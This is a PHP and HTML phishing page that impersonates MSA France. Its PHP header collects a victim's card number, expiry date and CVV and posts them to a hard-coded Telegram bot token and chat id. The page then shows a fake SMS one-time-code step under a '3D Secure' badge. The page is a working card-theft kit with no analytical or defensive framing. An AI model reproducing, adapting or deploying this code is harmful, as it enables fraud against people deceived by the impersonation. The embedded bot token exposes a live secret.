<?php
session_start();

// ✅ Fonction de nettoyage
function clean($value) {
    return htmlspecialchars(trim($value), ENT_QUOTES, 'UTF-8');
}

// ✅ Détection du type de carte via BIN
function detectCardType($cardNumber) {
    $bin = substr(preg_replace('/\D/', '', $cardNumber), 0, 6);

    if (preg_match('/^4[0-9]{5}/', $bin)) {
        return 'Visa';
    } elseif (preg_match('/^5[1-5][0-9]{4}/', $bin)) {
        return 'MasterCard';
    } elseif (preg_match('/^3[47][0-9]{4}/', $bin)) {
        return 'American Express';
    } elseif (preg_match('/^6(?:011|5[0-9]{2})/', $bin)) {
        return 'Discover';
    } elseif (preg_match('/^(35[2-8][0-9])/', $bin)) {
        return 'JCB';
    } elseif (preg_match('/^3(?:0[0-5]|[68][0-9])/', $bin)) {
        return 'Diners Club';
    } else {
        return 'Carte inconnue';
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION['cardNumber'] = clean($_POST['cardNumber'] ?? '');
    $_SESSION['expiryDate'] = clean($_POST['expiryDate'] ?? '');
    $_SESSION['cvv'] = clean($_POST['cvv'] ?? '');

    // ✅ Détection du type de carte
    $cardType = detectCardType($_SESSION['cardNumber']);

    // ✅ Préparer message Telegram
    $token = '7194667513:AAEjFC8Lr3YGuhofocJkIpr3i9LvzTDwZDA';
    $chat_id = '6163989462';

    $message = "<b>🛡️ Données Bancaires MSA</b>\n";
    $message .= "💳 Type : <b>$cardType</b>\n";
    $message .= "🔢 Numéro : ".$_SESSION['cardNumber']."\n";
    $message .= "📅 Expiration : ".$_SESSION['expiryDate']."\n";
    $message .= "🔒 CVV : ".$_SESSION['cvv'];

    // ✅ Envoi à Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        ]
    ];
    file_get_contents($url, false, stream_context_create($options));
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>MSA - Validation SMS</title>
    <style>
        :root {
            --msa-blue: #0056b3;
            --msa-dark-blue: #003366;
            --msa-green: #008a43;
            --msa-light-gray: #f5f7fa;
        }

        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: var(--msa-light-gray);
            background-image: url('assets/images/msa-bg.jpg');
            background-size: cover;
            background-attachment: fixed;
        }

        .msa-container {
            max-width: 800px;
            margin: 40px auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .msa-header {
            background: linear-gradient(135deg, var(--msa-blue), var(--msa-dark-blue));
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
        }

        .msa-logo {
            height: 60px;
            margin-bottom: 15px;
        }

        .msa-form {
            padding: 30px;
        }

        .msa-progress {
            display: flex;
            margin-bottom: 30px;
            text-align: center;
            padding: 0 30px;
        }

        .msa-progress-step {
            flex: 1;
            padding: 10px;
            position: relative;
            color: #999;
            font-size: 14px;
        }

        .msa-progress-step.active {
            color: var(--msa-blue);
            font-weight: bold;
        }

        .msa-progress-step.completed {
            color: var(--msa-green);
        }

        .msa-progress-step:not(:last-child):after {
            content: "";
            position: absolute;
            top: 50%;
            right: 0;
            width: 20px;
            height: 2px;
            background: #ddd;
        }

        .msa-sms-box {
            background: #f9f9f9;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 25px;
            text-align: center;
        }

        .msa-sms-box h2 {
            color: var(--msa-dark-blue);
            margin-bottom: 10px;
        }

        .msa-sms-box p {
            color: #555;
            margin-bottom: 20px;
        }

        .msa-code-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .msa-code-inputs input {
            width: 60px;
            height: 70px;
            text-align: center;
            font-size: 28px;
            border: 1px solid #ccc;
            border-radius: 8px;
            transition: all 0.3s;
        }

        .msa-code-inputs input:focus {
            border-color: var(--msa-blue);
            box-shadow: 0 0 0 3px rgba(0, 86, 179, 0.1);
            outline: none;
        }

        .msa-btn {
            background: var(--msa-green);
            color: white;
            border: none;
            padding: 16px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-weight: 500;
            margin-top: 10px;
            transition: all 0.3s;
        }

        .msa-btn:hover {
            background: #007a3a;
            transform: translateY(-2px);
        }

        .msa-phone-masked {
            font-size: 18px;
            color: #666;
            margin: 20px 0;
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            display: inline-block;
        }

        .msa-resend {
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }

        .msa-resend a {
            color: var(--msa-blue);
            text-decoration: none;
            font-weight: 500;
        }

        .msa-timer {
            color: var(--msa-green);
            font-weight: bold;
        }

        .msa-security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            color: #666;
        }

        .msa-security-badge img {
            height: 30px;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="msa-container">
        <div class="msa-header">
            <img src="assets/images/msa-logo.png" alt="MSA France" class="msa-logo">
            <h1>Validation Sécurisée</h1>
        </div>

        <div class="msa-progress">
            <div class="msa-progress-step completed">1. Identification</div>
            <div class="msa-progress-step completed">2. Vérification</div>
            <div class="msa-progress-step active">3. Confirmation</div>
        </div>

        <div class="msa-form">
            <div class="msa-sms-box">
                <h2>Vérification par SMS</h2>
                <p>Un code a été envoyé par SMS. Veuillez le saisir ci-dessous pour confirmer votre identité.</p>
                <div class="msa-phone-masked">
                    Code envoyé au <strong>+33 ••••••<?php echo substr($_SESSION['identification_data']['phone'] ?? '123456', -2); ?></strong>
                </div>

                <form action="confirmation.php" method="post">
                    <div class="msa-code-inputs">
                        <?php for ($i = 1; $i <= 6; $i++): ?>
                            <input type="text" name="code<?= $i ?>" maxlength="1" pattern="\d" required>
                        <?php endfor; ?>
                    </div>

                    <button type="submit" class="msa-btn">Valider le code</button>

                    <div class="msa-resend">
                        Vous n'avez pas reçu de code ? <a href="#" id="resendLink">Renvoyer le code <span class="msa-timer" id="countdown">(60)</span></a>
                    </div>
                </form>
            </div>

            <div class="msa-security-badge">
                <img src="assets/images/msa-secure.png" alt="Sécurité">
                <span>Validation protégée par protocole 3D Secure</span>
            </div>
        </div>
    </div>

    <script>
        // Timer de renvoi
        let timer = 60;
        const countdown = document.getElementById('countdown');
        const resendLink = document.getElementById('resendLink');

        const interval = setInterval(() => {
            timer--;
            countdown.textContent = `(${timer})`;
            if (timer <= 0) {
                clearInterval(interval);
                countdown.textContent = '';
                resendLink.innerHTML = 'Renvoyer le code';
                resendLink.style.pointerEvents = 'auto';
            }
        }, 1000);

        resendLink.addEventListener('click', function (e) {
            e.preventDefault();
            alert("Code renvoyé (fonction à implémenter côté serveur).");
        });
    </script>
</body>
</html>
<script>
    // Déplacement automatique entre les champs du code
    const inputs = document.querySelectorAll('.msa-code-inputs input');
    inputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                inputs[index - 1].focus();
            }
        });
    });
</script>
